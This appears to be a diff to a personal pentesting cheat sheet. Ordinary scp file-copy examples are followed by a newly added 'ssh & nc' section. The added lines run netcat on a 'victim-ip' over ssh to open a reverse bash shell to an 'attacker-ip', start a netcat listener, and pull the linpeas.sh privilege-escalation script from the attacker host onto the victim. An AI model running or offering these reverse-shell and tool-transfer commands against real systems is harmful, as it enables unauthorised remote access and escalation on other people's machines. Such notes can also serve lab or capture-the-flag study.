@@ -22,4 +22,17 @@ scp localfile  remoteusername@remotehost:/remote/directory
 scp remoteusername@remotehost:/remotefile /local/directory
 ```
 
+## ssh & nc
+
+```
+ssh username@victim-ip "nc attacker-ip port -e /bin/bash"
+```
+
+```
+nc -nlvp port
+```
+
+```
+ssh username@victim-ip "nc attacker-ip port > linpeas.sh"
+```
 
